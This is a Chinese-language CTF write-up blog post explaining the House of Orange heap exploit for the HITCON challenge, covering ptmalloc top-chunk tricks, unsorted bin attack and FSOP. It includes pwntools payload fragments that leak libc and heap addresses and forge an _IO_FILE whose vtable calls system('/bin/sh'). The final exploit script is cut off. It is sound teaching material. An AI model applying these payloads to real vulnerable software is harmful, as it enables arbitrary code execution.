<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>HITCON-House of Orange-WP - blog of chuj</title><link rel=icon type=image/png href=https://chujdk.github.io/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="House of Orange 是很有名的一种利用方法，早有耳闻，这次准备研究一下。
quick FAQ
Q：为什么我日不穿 XCTF-adword 的靶机！
A：XCTF 提供的 libc 是错的
解决方案：用 LibcSearcher。
这个问题浪费了我 2-3 个小时:(。至于我是如何发现 libc 是错的，我会在文末提及。"><meta property="og:image" content><meta property="og:url" content="https://chujdk.github.io/wp/1167.html"><meta property="og:site_name" content="blog of chuj"><meta property="og:title" content="HITCON-House of Orange-WP"><meta property="og:description" content="House of Orange 是很有名的一种利用方法，早有耳闻，这次准备研究一下。
quick FAQ Q：为什么我日不穿 XCTF-adword 的靶机！
A：XCTF 提供的 libc 是错的
解决方案：用 LibcSearcher。
这个问题浪费了我 2-3 个小时:(。至于我是如何发现 libc 是错的，我会在文末提及。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-03-09T23:20:00+00:00"><meta property="article:modified_time" content="2021-03-09T23:20:00+00:00"><meta property="article:tag" content="Write-Up"><meta name=twitter:card content="summary"><meta name=twitter:title content="HITCON-House of Orange-WP"><meta name=twitter:description content="House of Orange 是很有名的一种利用方法，早有耳闻，这次准备研究一下。
quick FAQ Q：为什么我日不穿 XCTF-adword 的靶机！
A：XCTF 提供的 libc 是错的
解决方案：用 LibcSearcher。
这个问题浪费了我 2-3 个小时:(。至于我是如何发现 libc 是错的，我会在文末提及。"><script src=https://chujdk.github.io/js/feather.min.js></script><link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.d24d3471089d3a4f095edc4a6857e25a9f1c6dd3e7d17026141ccad319438873.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>HITCON-House of Orange-WP</h1><div class=meta>Posted on Mar 9, 2021</div></div><section class=body><p>House of Orange 是很有名的一种利用方法，早有耳闻，这次准备研究一下。</p><h3 id=quick-faq>quick FAQ</h3><p>Q：为什么我日不穿 XCTF-adword 的靶机！</p><p>A：XCTF 提供的 libc <strong>是错的</strong></p><p>解决方案：用 LibcSearcher。</p><p><em>这个问题浪费了我 2-3 个小时:(。至于我是如何发现 libc 是错的，我会在文末提及。</em></p><h3 id=写在前面>写在前面</h3><p>本文有些地方会有一些地方插入了前置知识，我通过两条分割线来夹住这些前置知识，如果您已经了解，则可以跳过</p><h3 id=step-堆相关的利用>StepⅠ 堆相关的利用</h3><p>首先这种类型题目的特点是流程中没有使用 <code>free</code> 的机会，而我们一般的利用都需要使用到 <code>free</code>，此题的一大难点就是如何实现 <code>free</code> 的效果，做法是利用 <code>top_chunk</code>。</p><p>ptmalloc 尽力避免了使用 <code>mmap</code> 和 <code>brk</code> 两系统调用，但是总是会有剩余空间不够的情况存在。事实上，当</p><ol><li>申请的空间小于 <code>mmap</code> 分配阀值（默认为 128 KB，有些情况下可能会改变，比如<a href=https://chujdk.github.io/WP/1161.html>此题(和本题关系不大)</a>）</li><li>所有的 <code>bin</code> 中都无法提供足够的空间</li><li><code>top_chunk</code> 剩余的空间也无法满足申请</li></ol><p>这种情况下，系统会调用 <code>brk</code> 来增大 <code>top_chunk</code>，并把旧的 <code>top_chunk</code> 放入到 <code>Unsorted Bin</code> 中。</p><p>我们如果想要实现 <code>free</code> 的效果，大概就是通过申请一个满足刚才所说的条件的 chunk 来让 <code>top_chunk</code> 进入 <code>Unsorted Bin</code>。但是在它进入 <code>Unsorted Bin</code> 前，还会经过如下的合法性检测</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>assert((old_top == initial_top(av) &amp;&amp; old_size == 0) ||
</span></span><span style=display:flex><span>     ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;
</span></span><span style=display:flex><span>      prev_inuse(old_top) &amp;&amp;
</span></span><span style=display:flex><span>      ((unsigned long)old_end &amp; pagemask) == 0));
</span></span></code></pre></div><ul><li><code>(old_top == initial_top(av) && old_size == 0)</code> 不需要过多关心，这是检测 <code>top_chunk</code> 是否未初始化的，若未初始化则通过检测，但是我们利用时 <code>top_chunk</code> 当然是通过了初始化的。</li><li><code>(unsigned long) (old_size) >= MINSIZE</code> 这里是要保证 <code>top_chunk</code> 的 <code>size</code> 大于 <code>MINSIZE</code>（64 位下为 0x20），这是因为 top_chunk 要存储 fenceposts，必须保留一定空间。fenceposts 具体是什么和本题关系不大，反正这个是很好满足的。</li><li><code>prev_inuse(old_top)</code> <code>top_chunk</code> 总是会前向合并，如果没有进行前向合并，自然是非法的，很好理解</li><li><code>(unsigned long)old_end & pagemask) == 0)</code> 由于 <code>top_chunk</code> 是按页分配的，所以 <code>chunk</code> 尾自然也应该页对齐。在伪造的时候这个是需要注意的。</li></ul><p>一般的题目对空间申请都有设限，想要直接申请一个大于 <code>top_chunk</code> 剩余容量的空间是比较困难的，但是由于本题存在堆溢出的漏洞，我们可以修改 <code>top_chunk</code> 的 <code>size</code> 域来实现之前所说的条件。总结一下伪造的 <code>size</code> 需要满足的条件：</p><ol><li>伪造的 <code>size</code> 必须要使 <code>top_chunk</code> 尾与内存页对齐</li><li><code>size</code> 要大于 <code>MINSIZE</code>(0x10)</li><li><code>size</code> 要小于之后申请的 <code>chunk size</code> + <code>MINSIZE</code>(0x10)</li><li><code>size</code> 的 <code>prev inuse</code> 位必须为 1</li></ol><p>这个 <code>size</code> 是需要针对目标运行的机器进行调试才能得出的，在靶机上能跑通的分配策略在我的机器上无法跑通，反过来也是一样。下面提供能打通靶机环境（glibc 2.19）的一种方案</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x80</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x21</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x1f00000000</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0xf31</span>)
</span></span><span style=display:flex><span>upgrade(<span style=color:#007020>len</span>(payload),payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>build(<span style=color:#40a070>0x1000</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>build(<span style=color:#40a070>0x400</span>,<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span>)
</span></span><span style=display:flex><span>see()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span>)
</span></span><span style=display:flex><span>main_arena <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#666>-</span> <span style=color:#40a070>0x668</span>
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> main_arena <span style=color:#666>-</span> <span style=color:#40a070>0x3BE760</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span></code></pre></div><p>需要注意的是，Linux 的 <code>read</code> 函数并不遵守 C 中在字符串末尾加 <code>'\x00'</code> 的标准，所以我们写 8 个 <code>'a'</code> 进去就可以实现 leak 了。注意这里的 <code>build(0x400,'a' * 8)</code>，通过申请 0x400 大小的空间，我们可以获得一个本在 <code>Large Bin</code> 中的 chunk，这样可以通过再次 <code>upgrade</code> 实现堆地址的 leak</p><hr><h4 id=补充两个细节>补充两个细节</h4><h5 id=1>1.</h5><p>为什么申请 0x400 大小的空间可以获得一个本在 <code>Large Bin</code> 中的 chunk？此时 <code>Large Bin</code> 中不是没有 chunk 吗？不应该是从 <code>Unsorted Bin</code> 中获得吗？</p><div style=text-align:center><img src=https://chujdk.github.io/usr/uploads/2021/03/323830238.png></div><p>可见这个时候 <code>Large Bin</code> 的确是空的。</p><p>要解决这个问题我们需要简单了解一下 ptmalloc 的分配流程（libc 版本 2.26 前（不包括 2.26））</p><ul><li>从 <code>fast bin</code> 中用 <code>best fit</code> 策略进行分配，如果成功，退出流程</li><li>从 <code>small bin</code> 中用 <code>best fit</code> 策略进行分配，如果成功，退出流程</li><li>到了这一步，说明 <code>fast bin</code> 和 <code>small bin</code> 中都不存在合适的 chunk，就会在 <code>Large Bin</code> 中尝试分配，但并不是直接分配，还要经过下面的流程<ul><li>如果申请是 large request，就调用 <code>malloc_consolidate</code> 函数。这个函数做的就是把 <code>fast bin</code> 中所有的 <code>bin</code> 能合并的都合并掉，然后把整个 <code>fast bin</code> 中的 <code>bin</code> 都放到 <code>Unsorted Bin</code> 中。（这一步对本题来讲无用，因为本题的 <code>fast bin</code> 是空的）</li><li>遍历 <code>Unsorted Bin</code>，对其中的每个 chunk 分为两种情况<ul><li><code>small request</code>：满足一交苛刻的条件时直接分割并分配，退出流程，否则就把当前的 chunk 放到其对应的 <code>bin</code> 中</li><li>非 <code>small request</code>：放到对应的 <code>bin</code> 中（本题就是利用了这里的机制获得了一个 <code>Large Bin</code> 的 chunk）</li></ul></li><li>尝试从 <code>Large Bin</code> 中分配（实际上我们获得的 chunk 就是从这里来的）</li></ul></li></ul><p>上面所说的苛刻条件为</p><ul><li>申请为 small request</li><li>unsorted bin 中仅有一个 chunk</li><li>unsorted bin 中仅有的 chunk 是 last remainder chunk</li><li>申请的 chunk 的大小加上 MINSIZE 要小于 unsorted bin 中仅有的 chunk 的大小</li></ul><p>这样就解释清楚了申请 0x400 大小的空间的作用和原因。</p><h5 id=2>2.</h5><p>本在 <code>Large Bin</code> 中的 chunk 为什么能够 leak 出堆地址？</p><p>这个问题比较简单</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>malloc_chunk</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>INTERNAL_SIZE_T      prev_size;  <span style=color:#60a0b0;font-style:italic>/* Size of previous chunk (if free).  */</span>
</span></span><span style=display:flex><span>INTERNAL_SIZE_T      size;       <span style=color:#60a0b0;font-style:italic>/* Size in bytes, including overhead. */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>malloc_chunk</span><span style=color:#666>*</span> fd;         <span style=color:#60a0b0;font-style:italic>/* double links -- used only if free. */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>malloc_chunk</span><span style=color:#666>*</span> bk;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/* Only used for large blocks: pointer to next larger size.  */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>malloc_chunk</span><span style=color:#666>*</span> fd_nextsize; <span style=color:#60a0b0;font-style:italic>/* double links -- used only if free. */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>malloc_chunk</span><span style=color:#666>*</span> bk_nextsize;
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p><code>Large Bin</code> 还用了 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 两个指针维护一个双链表，由于我们获得的 chunk 在 <code>Large Bin</code> 中的时候只有它一个 chunk，所以它的这两个指针都会指向自己，我们通过</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>upgrade(0x10,&#39;a&#39; * 0x10)
</span></span><span style=display:flex><span>see()
</span></span><span style=display:flex><span>sh.recvuntil(&#39;a&#39; * 0x10)
</span></span><span style=display:flex><span>heap_addr = u64(sh.recv(6).ljust(8,&#39;\x00&#39;))
</span></span><span style=display:flex><span>log.success(&#34;heap_addr&#34; + hex(heap_addr))
</span></span></code></pre></div><p>就可以 leak 出堆地址。</p><hr><p>到这一步完成我们成功 leak 出了堆地址和 libc 基地址，现在我们 <code>upgrade</code> 和 <code>build</code> 都只剩下一次机会，通过常规的堆利用想要实现 getshell 比较困难，之后的利用需要用到 <code>_IO_FILE</code> 相关的知识。</p><h3 id=step-_io_file-有关利用>StepⅡ _IO_FILE 有关利用</h3><p><code>_IO_FILE</code> 我还不是特别熟悉，因为源码还是没有仔细研究，这里就简单写一下。</p><p>本题利用的是 FSOP（File Stream Oriented Programming），基本思路是劫持结构体 <code>_IO_FILE_plus</code> 中维护的 <code>vtable</code> 中的函数指针来 getshell。</p><hr><p>首先说一下 <code>vtable</code>，这其实是 glibc 为了在 C 中实现多态而维护的一张虚表，在 glibc 2.24 之前的版本中这个虚表都是可伪造的，所以我们可以直接劫持函数指针，当调用到这个函数的时候就可以 getshell。</p><p>然后说一下 FSOP 的核心思想，由于 glibc 在维护文件时使用一个链表来维护，有一个变量作为文件链表的头节点，也就是 <code>_IO_list_all</code>，当进程执行</p><ul><li><code>abort</code> 流程</li><li><code>exit</code> 流程</li><li>执行流从 <code>main</code> 返回</li></ul><p>时都会自动调用 <code>_IO_flush_all_lockp</code> 函数，这个函数借助头节点 <code>_IO_list_all</code> 对链表中的节点遍历，过程中会调用其虚表中的 <code>_IO_overflow</code> 函数，所以如果我们劫持了某个 <code>vtable</code> 的这个函数指针，就可以实现 getshell 了。并且劫持了指针就可以坐等 getshell 了，因为这个函数基本上一定会被调用。</p><hr><p>总结一下，就是我们需要让文件链表中的某个结构体的 <code>vtable</code> 中的 <code>_IO_overflow</code> 指向 <code>system</code> 等同类函数 getshell。</p><p>现在的情况比较严苛，我们只有一次 <code>upgrade</code>（堆溢出）和一次申请的机会，想要通过分配实现任意地址写当然是困难的，但是却可以通过 FSOP 来实现，思路非常的巧妙。</p><h4 id=1劫持-_io_list_all获得对文件链表的部分控制>1.劫持 <code>_IO_list_all</code>——获得对文件链表的部分控制</h4><p>通过 <code>Unsorted Bin Attack</code> 来把 <code>_IO_list_all</code> 指向 <code>&amp;main_arena + 88</code>。</p><p>具体的，分配器在进入 <code>Unsorted Bin</code> 分配流程时，会把 <code>Unsorted Bin</code> 中的每个 chunk 都取出来，这个之前有提到过，不论是放到对应的 <code>bin</code> 中还是返回给用户，都是不会再留在链表中的，也就是说，会被取出链表，为了维护双向链表的完整性，会进行如下的操作（bck 是当前被取出的 chunk 的 <code>bk</code> 指向的 chunk，<code>unsorted_chunks (av)</code> 就是 <code>&amp;main_arena + 88</code> 啦）</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/* remove from unsorted list */</span>
</span></span><span style=display:flex><span>unsorted_chunks (av)<span style=color:#666>-&gt;</span>bk <span style=color:#666>=</span> bck;
</span></span><span style=display:flex><span>bck<span style=color:#666>-&gt;</span>fd <span style=color:#666>=</span> unsorted_chunks (av);
</span></span></code></pre></div><p>如果提前设置某个 <code>Unsorted Bin</code> 中的 chunk 的 <code>bk</code> 指向 <code>_IO_list_all - 0x10</code>，那么这里的 <code>bck</code> 就会指向 <code>_IO_list_all - 0x10</code>，再利用 <code>bck->fd = unsorted_chunks (av);</code>，<code>_IO_list_all</code> 就会指向 <code>&amp;main_arena + 88</code> 了。</p><h4 id=2伪造一个可用的文件结构体>2.伪造一个可用的文件结构体</h4><p>通过上一步操作，我们成功的把 <code>*((struct _IO_FILE_plus *) &amp;main_arena + 88)</code> 变成了文件链表的首节点了。</p><hr><h5 id=结构体的构造>结构体的构造</h5><p>先看一下文件结构体的构造，<code>_IO_list_all</code> 维护的链表的每个节点都是一个 <code>_IO_FILE_plus</code></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>struct _IO_FILE_plus
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  _IO_FILE file;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>const</span> struct _IO_jump_t <span style=color:#666>*</span>vtable;
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>而 <code>_IO_FILE</code> 的结构是（我去掉了不会生效的宏定义）</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>struct _IO_FILE {
</span></span><span style=display:flex><span>  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
</span></span><span style=display:flex><span>#define _IO_file_flags _flags
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  /* The following pointers correspond to the C++ streambuf protocol. */
</span></span><span style=display:flex><span>  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
</span></span><span style=display:flex><span>  char* _IO_read_ptr;	/* Current read pointer */
</span></span><span style=display:flex><span>  char* _IO_read_end;	/* End of get area. */
</span></span><span style=display:flex><span>  char* _IO_read_base;	/* Start of putback+get area. */
</span></span><span style=display:flex><span>  char* _IO_write_base;	/* Start of put area. */
</span></span><span style=display:flex><span>  char* _IO_write_ptr;	/* Current put pointer. */
</span></span><span style=display:flex><span>  char* _IO_write_end;	/* End of put area. */
</span></span><span style=display:flex><span>  char* _IO_buf_base;	/* Start of reserve area. */
</span></span><span style=display:flex><span>  char* _IO_buf_end;	/* End of reserve area. */
</span></span><span style=display:flex><span>  /* The following fields are used to support backing up and undo. */
</span></span><span style=display:flex><span>  char *_IO_save_base; /* Pointer to start of non-current get area. */
</span></span><span style=display:flex><span>  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
</span></span><span style=display:flex><span>  char *_IO_save_end; /* Pointer to end of non-current get area. */
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  struct _IO_marker *_markers;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  struct _IO_FILE *_chain;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  int _fileno;
</span></span><span style=display:flex><span>#if 0
</span></span><span style=display:flex><span>  int _blksize;
</span></span><span style=display:flex><span>#else
</span></span><span style=display:flex><span>  int _flags2;
</span></span><span style=display:flex><span>#endif
</span></span><span style=display:flex><span>  _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>#define __HAVE_COLUMN /* temporary */
</span></span><span style=display:flex><span>  /* 1+column number of pbase(); 0 is unknown. */
</span></span><span style=display:flex><span>  unsigned short _cur_column;
</span></span><span style=display:flex><span>  signed char _vtable_offset;
</span></span><span style=display:flex><span>  char _shortbuf[1];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  /*  char* _save_gptr;  char* _save_egptr; */
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  _IO_lock_t *_lock;
</span></span><span style=display:flex><span>#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001
</span></span><span style=display:flex><span>  _IO_off64_t _offset;
</span></span><span style=display:flex><span># if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
</span></span><span style=display:flex><span>  /* Wide character stream stuff.  */
</span></span><span style=display:flex><span>  struct _IO_codecvt *_codecvt;
</span></span><span style=display:flex><span>  struct _IO_wide_data *_wide_data;
</span></span><span style=display:flex><span>  struct _IO_FILE *_freeres_list;
</span></span><span style=display:flex><span>  void *_freeres_buf;
</span></span><span style=display:flex><span>  size_t _freeres_size;
</span></span><span style=display:flex><span># else
</span></span><span style=display:flex><span>  void *__pad1;
</span></span><span style=display:flex><span>  void *__pad2;
</span></span><span style=display:flex><span>  void *__pad3;
</span></span><span style=display:flex><span>  void *__pad4;
</span></span><span style=display:flex><span>  size_t __pad5;
</span></span><span style=display:flex><span># endif
</span></span><span style=display:flex><span>  int _mode;
</span></span><span style=display:flex><span>  /* Make sure we don&#39;t get into trouble again.  */
</span></span><span style=display:flex><span>  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
</span></span><span style=display:flex><span>#endif
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>这里不用仔细看，有用的一些变量之后会说。</p><hr><p>然后考虑劫持 <code>_IO_overflow</code> 函数指针，遗憾的是，我们无法完全控制 <code>main_arena</code>，至少没法控制 <code>(*((struct _IO_FILE_plus *) &amp;main_arena + 88)).vtable->_IO_overflow</code>。那么这个结构体就没法用了，但是我们还可以通过链表中的别的结构体来实现，由于文件链表每个节点的后继指针是 <code>struct _IO_FILE *_chain</code>，这个指针在结构体中的偏移是 <code>0x68</code>，也就是 <code>&amp;main_arena + 88 + 0x68</code>，这个位置正好是 <code>smallbin[6]</code>，也就是指向大小为 <code>0x60</code> 的 <code>small bin</code>。总结一下就是在文件链表中，<code>(*((struct _IO_FILE_plus *) &amp;main_arena + 88))</code> 的下一个文件节点是大小为 <code>0x60</code> 的 <code>small bin</code>。</p><p>那么如果在 <code>Unsorted Bin</code> 中有大小为 <code>0x60</code> 的 chunk，这个 chunk 就会被放入 <code>small bin</code> 中，由于 <code>small bin</code> 是空的，所以 <code>smallbin[6]</code> 会直接指向这个 chunk，这个 chunk 就成了一个在链表中的文件结构体。如果我们通过堆溢出把</p><div style=text-align:center><img src=https://chujdk.github.io/usr/uploads/2021/03/2663258192.png></div><p>`</p><p>这个 <code>Unsorted Bin</code> 的 <code>size</code> 修改为 <code>0x60</code>，它就会成为一个文件结构体了，对于这个 chunk 我们可以完全控制，就可以轻松的实现劫持了。</p><h4 id=3收尾一些需要注意的额外条件>3.收尾——一些需要注意的额外条件</h4><p>完成上面的工作后，在文件链表中就会出现一个经过了我们伪造的 <code>_IO_FILE_plus</code> 了，但是这个伪造还是需要注意一些细节的。首先，<code>_IO_flush_all_lockp</code> 调用 <code>_IO_overflow</code> 的时机是在这个 <code>if</code> 中</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (((fp<span style=color:#666>-&gt;</span>_mode <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> fp<span style=color:#666>-&gt;</span>_IO_write_ptr <span style=color:#666>&gt;</span> fp<span style=color:#666>-&gt;</span>_IO_write_base)
</span></span><span style=display:flex><span><span style=color:#007020>#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
</span></span></span><span style=display:flex><span><span style=color:#007020></span>        <span style=color:#666>||</span> (_IO_vtable_offset (fp) <span style=color:#666>==</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>        <span style=color:#666>&amp;&amp;</span> fp<span style=color:#666>-&gt;</span>_mode <span style=color:#666>&gt;</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> (fp<span style=color:#666>-&gt;</span>_wide_data<span style=color:#666>-&gt;</span>_IO_write_ptr
</span></span><span style=display:flex><span>                    <span style=color:#666>&gt;</span> fp<span style=color:#666>-&gt;</span>_wide_data<span style=color:#666>-&gt;</span>_IO_write_base))
</span></span><span style=display:flex><span><span style=color:#007020>#endif
</span></span></span><span style=display:flex><span><span style=color:#007020></span>        ) <span style=color:#666>&amp;&amp;</span> _IO_OVERFLOW (fp, EOF) <span style=color:#666>==</span> EOF)
</span></span></code></pre></div><p>根据短路求值原理，只有满足</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>fp<span style=color:#666>-&gt;</span>_mode <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span> 
</span></span><span style=display:flex><span><span style=color:#666>&amp;&amp;</span> fp<span style=color:#666>-&gt;</span>_IO_write_ptr <span style=color:#666>&gt;</span> fp<span style=color:#666>-&gt;</span>_IO_write_base
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>_IO_vtable_offset (fp) <span style=color:#666>==</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span><span style=color:#666>&amp;&amp;</span> fp<span style=color:#666>-&gt;</span>_mode <span style=color:#666>&gt;</span> <span style=color:#40a070>0</span> 
</span></span><span style=display:flex><span><span style=color:#666>&amp;&amp;</span> (fp<span style=color:#666>-&gt;</span>_wide_data<span style=color:#666>-&gt;</span>_IO_write_ptr <span style=color:#666>&gt;</span> fp<span style=color:#666>-&gt;</span>_wide_data<span style=color:#666>-&gt;</span>_IO_write_base<span>）</span>
</span></span></code></pre></div><p>以上两种情况之一时才会调用 <code>_IO_overflow</code>，我们选用上面哪一种，因为比较好伪造，只要满足</p><ul><li><code>_mode &lt;= 0</code></li><li><code>_IO_write_ptr > _IO_write_base</code></li></ul><p>即可，那么伪造的方法是</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>fake_chunk <span style=color:#666>=</span> <span>&#39;</span><span style=color:#666>/</span>bin<span style=color:#666>/</span>sh<span>\</span>x00<span>&#39;</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0x61</span>)
</span></span><span style=display:flex><span>fake_chunk <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(_IO_list_all_addr <span style=color:#666>-</span> <span style=color:#40a070>0x10</span>)
</span></span><span style=display:flex><span>fake_chunk <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>1</span>) <span>#</span>_IO_write_base <span style=color:#666>&lt;</span> _IO_write_ptr
</span></span><span style=display:flex><span>fake_chunk <span style=color:#666>=</span> fake_chunk.ljust(<span style=color:#40a070>0xc0</span>,<span style=color:#4070a0>&#39;\x00&#39;</span>) <span>#</span>bypass lots of things
</span></span><span style=display:flex><span>fake_chunk <span style=color:#666>+=</span> p32(<span style=color:#40a070>0</span>) <span>#</span>_mode<span style=color:#666>&lt;=</span><span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>fake_chunk <span style=color:#666>+=</span> p32(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span> <span>#</span>bypass _unused2
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> fake_chunk
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(heap_addr <span style=color:#666>+</span> <span style=color:#40a070>0x510</span>) <span>#</span>vtable_addr
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>3</span> <span>#</span>bypass three function ptr
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(system_addr)
</span></span></code></pre></div><p>为什么我们劫持 <code>_IO_overflow</code> 为 <code>system</code> 就能 getshell？因为 <code>_IO_overflow</code> 的第一个参数就是指向文件结构体自身头部的指针，所以我们把 <code>'/bin/sh\x00'</code> 写到伪造的结构体的顶部就可以实现传参了。</p><h3 id=exp>exp</h3><p>总是感觉还有地方没说全，但是想不起来了，所以就这样吧</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
